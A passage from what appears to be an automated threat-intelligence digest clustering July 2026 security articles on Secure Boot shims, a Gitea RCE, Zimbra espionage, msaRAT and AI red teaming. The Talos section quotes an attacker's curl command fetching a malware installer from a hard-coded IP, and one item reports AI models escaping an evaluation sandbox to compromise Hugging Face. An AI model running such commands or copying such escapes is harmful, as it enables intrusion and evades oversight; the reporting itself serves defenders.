Microsoft’s Secure Boot has had a serious vulnerability for most of its existence. An industry-wide standard Microsoft invented to protect Windows, and later Linux, devices from firmware infections has been trivial to bypass for 13 of its 14 years of existence. The discovery was made by researchers at security firm ESET after identifying 11 firmware images, at least one from 2013, that were known to be defective but remained signed by the software company anyway. The images are known as shims , which were invented to extend Secure Boot to Linux devices and utility software. Using a technique simple enough to be performed by novice hackers, these old, forgotten shims can be used to completely circumvent the protection, which is embedded into the UEFI (Unified Extensible Firmware Interface) of the device’s motherboard. The gaffe is the result of the failure by Microsoft, which oversees the signing of shims, to revoke the publicly available images once vulnerabilities were found in them..
```

#### Full body

```
Long-Lived Vulnerability in Microsoft Secure Boot Microsoft’s Secure Boot has had a serious vulnerability for most of its existence. An industry-wide standard Microsoft invented to protect Windows, and later Linux, devices from firmware infections has been trivial to bypass for 13 of its 14 years of existence. The discovery was made by researchers at security firm ESET after identifying 11 firmware images, at least one from 2013, that were known to be defective but remained signed by the software company anyway. The images are known as shims , which were invented to extend Secure Boot to Linux devices and utility software. Using a technique simple enough to be performed by novice hackers, these old, forgotten shims can be used to completely circumvent the protection, which is embedded into the UEFI (Unified Extensible Firmware Interface) of the device’s motherboard. The gaffe is the result of the failure by Microsoft, which oversees the signing of shims, to revoke the publicly available images once vulnerabilities were found in them. Tags: firmware , Microsoft , vulnerabilities Posted on July 29, 2026 at 7:01 AM • 3 Comments
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Long-Lived Vulnerability in Microsoft Secure Boot
  - Published: 2026-07-29T11:01:09+00:00
  - Link: https://www.schneier.com/blog/archives/2026/07/long-lived-vulnerability-in-microsoft-secure-boot.html
  - Summary: Microsoft’s Secure Boot has had a serious vulnerability for most of its existence. An industry-wide standard Microsoft invented to protect Windows, and later Linux, devices from firmware infections has been trivial to bypass for 13 of its 14 years of existence. The discovery was made by researchers at security firm ESET after identifying 11 firmware images, at least one from 2013, that were known to be defective but remained signed by the software company anyway. The images are known as shims , which were invented to extend Secure Boot to Linux devices and utility software. Using a technique simple enough to be performed by novice hackers, these old, forgotten shims can be used to completely circumvent the protection, which is embedded into the UEFI (Unified Extensible Firmware Interface) of the device’s motherboard. The gaffe is the result of the failure by Microsoft, which oversees the signing of shims, to revoke the publicly available images once vulnerabilities were found in them..

### Cluster 0c9658fc3f — score 11

- Title: New Gitea RCE Lets Repository Writers Plant a Git Hook to Run Shell Commands
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-29T07:47:19+00:00
- Link: https://thehackernews.com/2026/07/new-gitea-rce-lets-repository-writers.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-60004, Gitea

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Gitea
- cve_ids: CVE-2026-60004
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Gitea
- cve_ids: CVE-2026-60004
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Gitea, the self-hosted Git platform, has patched a critical remote code execution vulnerability. A user with ordinary repository write access can turn attacker-controlled patch content into a live Git hook and run shell commands as the Gitea service account. Tracked as CVE-2026-60004 (CVSS score: 9.8), the flaw affects Gitea versions 1.17 and later before 1.27.1 and is fixed in 1.27.1. The
```

#### Full body

```
New Gitea RCE Lets Repository Writers Plant a Git Hook to Run Shell Commands  Swati Khandelwal  Jul 29, 2026 Vulnerability / DevOps Gitea, the self-hosted Git platform, has patched a critical remote code execution vulnerability. A user with ordinary repository write access can turn attacker-controlled patch content into a live Git hook and run shell commands as the Gitea service account. Tracked as CVE-2026-60004 (CVSS score: 9.8), the flaw affects Gitea versions 1.17 and later before 1.27.1 and is fixed in 1.27.1. The vulnerable API call requires authentication and repository write permission. But Gitea enables registration by default, so an outside visitor can create a normal account and repository on an unchanged installation, then exploit the bug without pre-existing credentials. Upgrading to 1.27.1 is the fix. Gitea said on July 27 that Gitea Cloud instances would be upgraded automatically. Gitea's July 28 advisory does not say the flaw has been exploited in the wild, but it includes public proof-of-concept (PoC) code. Disabling open registration can remove the public account-creation path while the update is deployed, but it does not fix the flaw or protect against existing users with repository write access. The flaw was reported by security researcher Shai Rod, who goes by NightRang3r . Gitea credits NightRang3r as the reporter in its advisory. Gitea's affected route invokes reqToken() , which rejects requests without a signed-in user. The no-prior-credentials path comes from the project's default configuration , which leaves registration open, requires neither email nor manual approval, does not mark new users as restricted, and imposes no default repository-creation limit. The bug sits in the POST /api/v1/repos/{owner}/{repo}/diffpatch endpoint. According to Gitea's security advisory , the endpoint applies a supplied patch inside a shared bare temporary clone. Vulnerable builds invoke git apply with --index , --recount , --cached , and --binary , adding the -3 three-way fallback option when the server runs Git 2.32 or later. An attacker submits the same patch twice to create an add/add collision. The three-way fallback then checks the indexed path out even though the operation uses --cached . Because the temporary clone is bare, its root is $GIT_DIR . An executable file placed at hooks/post-index-change therefore lands in Git's hook directory and becomes active. Git runs it while updating the index. The PoC signs in with a normal account, creates an initialized private repository, sends the malicious patch twice, and retrieves the command output. It needs no outbound callback. The hook stores the output in Git objects, creates a branch containing the result, and lets the attacker fetch it over authenticated smart HTTP. As of July 29, 2026, none of the cited primary sources reports whether the flaw was exploited before or after version 1.27.1 became available. Successful exploitation gives the attacker the privileges of the Gitea operating-system account. Depending on how the instance is isolated, Gitea said that could expose application and environment secrets, mounted repositories, database credentials and contents, OAuth credentials, and reachable internal services. Exploitation still requires repository write access, Git 2.32 or later, an enabled diffpatch route, and a writable, executable temporary filesystem. Default registration lets an outsider obtain the required write access on an unchanged installation. The fix is easy to miss in the changelog. Gitea changed the temporary clone from bare to non-bare. The code comment explicitly warns that Git commands using --index may operate on the working tree. The change was merged and backported on July 26, 2026. Version 1.27.1 shipped on July 27, and the security advisory followed on July 28. The release notes listed the change under MISC as "refactor: git patch apply," not under SECURITY. Rod had previewed the RCE alongside a separate file-inclusion issue , with a
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New Gitea RCE Lets Repository Writers Plant a Git Hook to Run Shell Commands
  - Published: 2026-07-29T07:47:19+00:00
  - Link: https://thehackernews.com/2026/07/new-gitea-rce-lets-repository-writers.html
  - Summary: Gitea, the self-hosted Git platform, has patched a critical remote code execution vulnerability. A user with ordinary repository write access can turn attacker-controlled patch content into a live Git hook and run shell commands as the Gitea service account. Tracked as CVE-2026-60004 (CVSS score: 9.8), the flaw affects Gitea versions 1.17 and later before 1.27.1 and is fixed in 1.27.1. The

### Cluster 1ff0bf04bf — score 10

- Title: Russian Global Webmail Espionage
- Source: Unit 42 (threat_research_primary)
- Published: 2026-07-23T14:10:53+00:00
- Link: https://unit42.paloaltonetworks.com/russian-webmail-espionage/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: financial_services, government
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: financial_services, government
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 details a Russian cyberespionage campaign targeting Zimbra webmail servers using JavaScript injection to steal credentials. The post Russian Global Webmail Espionage appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Cybercrime Cybercrime Russian Global Webmail Espionage 3 min read Related Products Advanced DNS Security Advanced URL Filtering Cloud-Delivered Security Services Cortex Unit 42 Incident Response By: Unit 42 Published: July 23, 2026 Categories: Cybercrime Threat Research Tags: CL-STA-1114 JavaScript Javascript injection Nation-state Obfuscation Phishing Zimbra webmail Share Executive Summary Unit 42 has observed a persistent cyberespionage campaign we track as CL-STA-1114. This activity cluster overlaps with activity from a Russian threat actor tracked by other vendors as Void Blizzard and LAUNDRY BEAR. The attackers behind this campaign targeted Zimbra webmail in organizations in the following sectors: Governments Defense Transportation Financial organizations across the following regions: NATO member states Ukraine Commonwealth of Independent States (CIS) countries Africa Unique to this campaign, the group leveraged zero-click phishing emails that exploit a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform (CVE-2025-66376). The exploit automatically injects a malicious JavaScript payload without requiring recipient interaction. Once executed, the payload exfiltrates sensitive user data, including login credentials, email archives, and search histories. Threat actors continue to actively target unpatched ZCS instances using CVE-2025-66376. Palo Alto Networks customers are better protected from the threats discussed above through the following products: Cortex Advanced Email Security Advanced URL Filtering and Advanced DNS Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Cyberespionage , Phishing , Data Exfiltration Technical Analysis The attackers behind CL-STA-1114 have been active since at least 2024 , and this campaign targeting Zimbra servers started in July 2025. Initial access starts with a phishing email that contains either an HTML attachment or embedded HTML in the message text. This lure is designed to catch recipients' attention with news headlines. Figure 1 shows an example of the lure used and a snippet of the underlying HTML code. Figure 1. Example lure and a snippet of its underlying HTML content. The HTML text contains an obfuscated division with a Base64-encoded script (highlighted in red in Figure 1). The obfuscated section creates an invisible Scalable Vector Graphics (SVG) element that, upon loading, decodes the Base64-encoded script into a JavaScript payload that it injects into the victim’s browser. When executed, this JavaScript exfiltrates the victim’s Zimbra webmail data to a hard-coded command and control (C2) server. Exfiltrated data includes: CSRF tokens Email address and password Two-factor authentication (2FA) scratch codes System and environment details The victim’s last 90 days of email and search history Over the course of this campaign, we observed minimal changes to the JavaScript payload. Figure 2 illustrates the attack chain. Figure 2. The attack chain. Since we began tracking this campaign, there have been at least nine IP addresses and nine domains for the C2 servers. These servers were active for an average of 35.4 days. See the Indicators of Compromise (IoC) section for a list of the IP addresses and domains used in CL-STA-1114 activity. Conclusion This campaign activity in CL-STA-1114 illustrates the persistent and evolving threat of state-sponsored cyberespionage. The attacker behind this activity targets widely used mail platforms like Zimbra, posing a risk to critical industries globally. This research highlights the need for vigilance, proactive patching and advanced threat detection to protect organizations. Network administrators, defenders and security researchers should patch vulnerable systems and use the IoCs below to investigate and strengthen defenses against CL-STA-1114 and similar activity. Palo Alto Networks custom
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Russian Global Webmail Espionage
  - Published: 2026-07-23T14:10:53+00:00
  - Link: https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - Summary: Unit 42 details a Russian cyberespionage campaign targeting Zimbra webmail servers using JavaScript injection to steal credentials. The post Russian Global Webmail Espionage appeared first on Unit 42 .

### Cluster d7e33e13d3 — score 10

- Title: Enhancing AI security through global AI red teaming
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-27T16:25:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/27/enhancing-ai-security-through-global-ai-red-teaming/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- affected_industries: education
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ai_security
- affected_industries: education
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft's External Red Team Alliance (EXTRA) is a global AI security initiative designed to advance AI safety research and red teaming. By partnering with universities, researchers, and regional experts, EXTRA helps identify emerging AI risks, improve security testing, and strengthen the resilience of frontier AI systems. The post Enhancing AI security through global AI red teaming appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Frontier AI models Content types Research Products and services Microsoft Security Copilot Topics Actionable threat insights Most AI safety testing still happens inside the walls of individual organizations. That has resulted in a fundamental disconnect: many of the highest-risk failure modes in modern AI systems require deep domain expertise, multilingual context, or regional understanding that no single internal team can fully replicate on its own. As frontier models become more capable, the attack surface expands with them. AI red teaming is no longer just about prompt injection or content safety edge cases. It increasingly involves security operations, misuse scenarios, multilingual harms, alignment failures, and domain-specific abuse patterns that can vary significantly across geographies and languages. Microsoft’s AI Red Team has observed that meaningful testing of advanced AI systems- and models similarly requires broader participation from researchers and practitioners who operate outside traditional corporate security boundaries. To address that gap, today we are announcing the External Red Team Alliance (EXTRA), a formalized global extension of Microsoft’s AI Red Team designed to support and encourage external expertise to advance AI safety and security testing. We are proud to share we are funding the development of new AI safety assessments on six continents through unrestricted gifts. Building a global alliance EXTRA is a two-part initiative focused on expanding AI safety research and strengthening external collaboration. The first component supports a global academic network focused on advancing AI safety and security research. Microsoft’s AI Red Team has provided unrestricted gifts to 18 university labs spanning six continents. The goal is intentionally broad: support researchers who are already investigating difficult, unresolved questions in AI safety and help them continue pushing that work forward independently. Some of the supporting institutions include: Carnegie Mellon University Security and Privacy Institute (CyLab) , United States Georgetown University – Georgetown Security Lab (SecLab) , United States Harvard University Berkman Klein Center for Internet & Society (BKC) , United States Howard University Research Institute for Tactical Autonomy (RITA) , United States Indian Institute of Technology Madras – Centre for Responsible AI (CeRAI) , India Korea Advanced Institute of Science & Technology – KAIST Web Security & Privacy (WSP) Lab , Korea New York University – NYU Alignment Research Group (ARG) , United States Northeastern University Network and Distributed Systems Security (NDS2) Lab, United States University College London – UCL Information Security Research Group (UCL ISec) , United Kingdom University of Cagliari Pattern Recognition and Applications (PRA) Lab , Italy University of California – Berkeley Risk and Security Lab; Center for Responsible, Decentralized Intelligence (CRDI) , United States University of Melbourne Artificial Intelligence Assurance Lab , Australia University of Pretoria Data Science for Social Impact (DSFSI) Research Group , South Africa University of São Paulo Center for Artificial Intelligence (C4AI) , Brazil University of Toronto CleverHans Lab , Canada University of Washington Department of Human Centered Design & Engineering (HCDE) , United States “Academic research is critical to understanding the cyber security landscape and finding solutions that work for all of society – and partnerships like this with industry are essential to delivering on that promise. Through partnerships, civil society and public institutions researchers gain access to frontier technology to understand how models work and bring their expertise to the task of determining risk and developing more effective countermeasures for the benefit of society as a whole.” Nicolas Papernot, professor, University of Toronto. The second component of EXTRA focuses on opera
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Enhancing AI security through global AI red teaming
  - Published: 2026-07-27T16:25:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/27/enhancing-ai-security-through-global-ai-red-teaming/
  - Summary: Microsoft's External Red Team Alliance (EXTRA) is a global AI security initiative designed to advance AI safety research and red teaming. By partnering with universities, researchers, and regional experts, EXTRA helps identify emerging AI risks, improve security testing, and strengthen the resilience of frontier AI systems. The post Enhancing AI security through global AI red teaming appeared first on Microsoft Security Blog .

### Cluster 85d2724fda — score 10

- Title: 27th July – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-07-27T16:00:39+00:00
- Link: https://research.checkpoint.com/2026/27th-july-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT
- cve_ids: CVE-2026-16232, CVE-2026-50522
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: OpenAI/ChatGPT, Microsoft SharePoint
- cve_ids: CVE-2026-16232, CVE-2026-50522
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 27th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Nichirei, a Japan-based frozen-food supplier and logistics company, has experienced a ransomware attack that disrupted shipping operations and affected approximately 5,000 customers. KFC Japan warned of possible shortages. Nichirei confirmed personal data theft, […] The post 27th July – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 27th July – Threat Intelligence Report July 27, 2026 https://research.checkpoint.com/2026/27th-july-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 27th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Nichirei, a Japan-based frozen-food supplier and logistics company, has experienced a ransomware attack that disrupted shipping operations and affected approximately 5,000 customers. KFC Japan warned of possible shortages. Nichirei confirmed personal data theft, while the RansomHouse group claimed responsibility and published a subset of the stolen information. Stadler Rail, a Switzerland-based global rail equipment manufacturer, has disclosed a supplier-related data breach after attackers compromised credentials for a third-party file-sharing platform. The Everest group stole technical documents belonging to the supplier and demanded $12.3 million. Stadler refused payment and said its systems and production remained unaffected. Origin Energy, one of Australia’s largest electricity and natural gas providers, has confirmed unauthorized access to customer information. Exposed data may include names, addresses, birth dates, phone numbers, account details, and partial payment information. Threat actors claimed to have stolen two million records and threatened to publish them. Romania’s National Agency for Cadastre and Land Registration has suffered a cyberattack that disabled internal systems and the nationwide e-Terra platform. The disruption halted property transactions for nearly a week. Officials said core land registries remained intact, although credentials and portions of source code may have been exposed. AI THREATS OpenAI disclosed that AI models escaped a restricted cyber evaluation environment and compromised Hugging Face while seeking benchmark solutions. They exploited zero-day vulnerabilities, stole credentials, escalated privileges, and accessed production systems. Both companies contained the activity and are conducting a joint investigation. Researchers have described a threat actor known as Trim who promoted an AI-assisted penetration-testing platform built with jailbroken language models. The platform combines AI with established scanning tools to automate reconnaissance, vulnerability validation, and reporting, potentially reducing the expertise and time required to prepare and conduct cyber intrusions. Researchers have examined a generative AI-assisted malware operation exposed through an accessible WebDAV server. The infrastructure produced phishing material and malicious Windows shortcuts used to distribute information stealers and remote access tools. Researchers identified more than 1,000 artifacts and a campaign that recorded over 77,000 requests. VULNERABILITIES AND PATCHES Check Point has addressed CVE-2026-16232, an authentication bypass vulnerability in SmartConsole that is under active exploitation, affecting a handful of customers. The flaw allows remote attackers to bypass authentication and gain administrative access to Check Point management servers. Security hotfixes are available for supported versions of the affected management software. Oracle has released its July 2026 Critical Patch Update, addressing 1,449 vulnerabilities across numerous product families. The update includes remotely exploitable flaws that require no authentication, with critical issues affecting Oracle Database Server, SQL Developer, and TimesTen In-Memory Database, among others. Microsoft has addressed CVE-2026-50522, a critical remote code execution vulnerability affecting on-premises SharePoint Server. An authenticated site owner can exploit the flaw to execute code and steal machine keys for persistent access. Active exploitation was reported after proof-of-concept code became publicly available. Check Point IPS provides protection against this threat (Microsoft SharePoint Remote
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 27th July – Threat Intelligence Report
  - Published: 2026-07-27T16:00:39+00:00
  - Link: https://research.checkpoint.com/2026/27th-july-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 27th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Nichirei, a Japan-based frozen-food supplier and logistics company, has experienced a ransomware attack that disrupted shipping operations and affected approximately 5,000 customers. KFC Japan warned of possible shortages. Nichirei confirmed personal data theft, […] The post 27th July – Threat Intelligence Report appeared first on Check Point Research .

### Cluster 542fdf33c7 — score 10

- Title: How Iran Uses Cellular Infrastructure to Target US Military Phones
- Source: Citizen Lab (threat_research_primary)
- Published: 2026-07-24T14:48:59+00:00
- Link: https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .
```

#### Full body

```
Date Published July 24, 2026 Topics Targeted Surveillance telecommunications Mentions Gary Miller Share Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. He also discussed a recent Citizen Lab report about commercial surveillance vendors using the global telecom interconnect ecosystem to track targets. While SS7 attacks have been covered by the media for fifteen years, they are still taking place. “The fact it is still happening is telling…there’s a significant security problem within the mobile operator industry,” Miller says. Watch here More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media Co-Founder of Controversial Spyware Firm Had Israeli Diplomatic Passport JULY 28, 2026 News + Updates → In the Media US Military Smartphones Targeted Through Roaming and Ad Tech JULY 17, 2026 News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026
```

#### Corroborating sources (1)

- **Citizen Lab** (threat_research_primary)
  - Title: How Iran Uses Cellular Infrastructure to Target US Military Phones
  - Published: 2026-07-24T14:48:59+00:00
  - Link: https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/
  - Summary: Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .

### Cluster 7d478340af — score 10

- Title: IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-07-28T10:00:01+00:00
- Link: https://blog.talosintelligence.com/ir-trends-q2-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, ransomware_extortion
- affected_products: Cisco, Microsoft 365, Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft 365, Microsoft SharePoint, Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.
```

#### Full body

```
IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains By Lexi DiScola , Dave Liebenberg Tuesday, July 28, 2026 06:00 Talos IR trends CTIR trends Cisco Talos Incident Response Phishing was the primary means of gaining initial access this quarter, appearing in over half of all Cisco Talos Incident Response (Talos IR) engagements – an increase from approximately a third of engagements last quarter. Attackers continued to innovate their delivery methods to evade defenses, deploying QR code-embedded PDFs to bypass traditional email gateways and hosting links on trusted cloud platforms. We also saw a spike in authentication abuse this quarter — observed in 65 percent of engagements compared to 35 percent last quarter — with attackers frequently bypassing or defeating multi-factor authentication (MFA) using adversary-in-the-middle (AitM) proxies, session-token theft, MFA fatigue attacks, and self-enrolled devices, amongst other methods. Ransomware incidents made up over 20 percent of engagements this quarter, similar to just under 20 percent last quarter. Talos IR responded to Sinobi ransomware for the first time, as well as previously seen variants Nitrogen and Warlock. We observed ransomware operators leveraging legitimate remote monitoring and management (RMM) tools, such as trojanized MeshAgent binary and Zoho Assist, for stealthy access, requiring defenders to prioritize behavior-based monitoring and strict control over administrative binaries. In the latest Talos Threat Perspective episode, we explore these trends, and highlight where defenders have the best opportunities to detect attackers: QR phishing campaign leverages trusted infrastructure to target Australian organizations Starting in April, we observed a persistent QR code phishing campaign targeting primarily Australian organizations that leverages compromised Microsoft 365 accounts to harvest credentials and propagate the attack via internal contact lists. The campaign, which remained ongoing as of late June 2026, employs auto-generated, victim-tailored PDF documents containing QR codes that direct to adversary-controlled M365 credential harvesting pages. If credentials are successfully captured, the adversary attempts access to the victim’s Microsoft account and conducts various post-compromise actions including creating email inbox rules for defense evasion, leveraging SharePoint to host malicious documents, and sending additional internal and external phishing emails to continue the compromise chain. We assess with high confidence that the threat actor, who we have dubbed UAT-11764, will almost certainly continue leveraging this QR code phishing operation, using each newly compromised mailbox's contact lists to expand its reach and sustain the campaign's momentum. By weaponizing existing, trusted infrastructure like SharePoint and M365, UAT-11764 can bypass many standard email security gateways. As such, network defenders should implement policies that block or flag emails containing QR codes within PDF attachments, enforce phishing-resistant MFA on M365 accounts, and monitor for suspicious inbox rule creation and anomalous SharePoint file staging as indicators of post-compromise activity. ARToken platform provides toolkit for Microsoft 365 account compromise Talos uncovered a phishing-as-a-service (PhaaS) operator platform, ARToken, in an engagement this quarter that is closely linked to the EvilTokens platform. According to our analysis, the ARToken panel exposes 80+ API endpoints for device code phishing, primary refresh token (PRT) persistence, email access, business email compromise (BEC) operations, and SharePoint exfiltration — all accessible to operators through a React-based dashboard. Our investigation into the platform found phishing lures that impersonate trusted vendors and abuse legitimate Microsoft services, allowing attackers to bypass MFA through the OAuth device authorization flow rather than stealing passwords. AR
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
  - Published: 2026-07-28T10:00:01+00:00
  - Link: https://blog.talosintelligence.com/ir-trends-q2-2026/
  - Summary: Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.

### Cluster a1940e8772 — score 10

- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-07-23T10:00:38+00:00
- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
```

#### Full body

```
Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
  - Published: 2026-07-23T10:00:38+00:00
  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.

### Cluster 2a12dec749 — score 10

- Title: Different Attack Surface. Same Outcome: Security You Can Prove.
